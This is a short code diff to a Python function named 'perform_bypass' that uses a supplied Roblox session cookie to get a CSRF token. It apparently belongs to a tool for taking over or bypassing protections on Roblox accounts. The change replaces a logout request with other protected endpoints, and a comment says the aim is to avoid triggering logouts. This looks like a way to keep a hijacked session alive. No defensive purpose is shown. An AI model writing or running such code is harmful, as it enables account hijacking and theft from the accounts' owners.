@@ -147,9 +147,16 @@ def perform_bypass(cookie):
     account_info = get_account_info(session)
 
     try:
-        # 1. Get CSRF Token
-        response = session.post("https://auth.roblox.com/v2/logout")
+        # 1. Get CSRF Token (Using a safer method that won't trigger logouts)
+        # We send a POST to a random protected endpoint to force Roblox to give us a token
+        response = session.post("https://auth.roblox.com/v2/login")
         csrf_token = response.headers.get("x-csrf-token")
+        
+        if not csrf_token:
+            # Fallback to another endpoint if first one fails
+            response = session.post("https://groups.roblox.com/v1/groups/1/payouts")
+            csrf_token = response.headers.get("x-csrf-token")
+
         if not csrf_token:
             return False, "Could not retrieve CSRF token", account_info, cookie
 
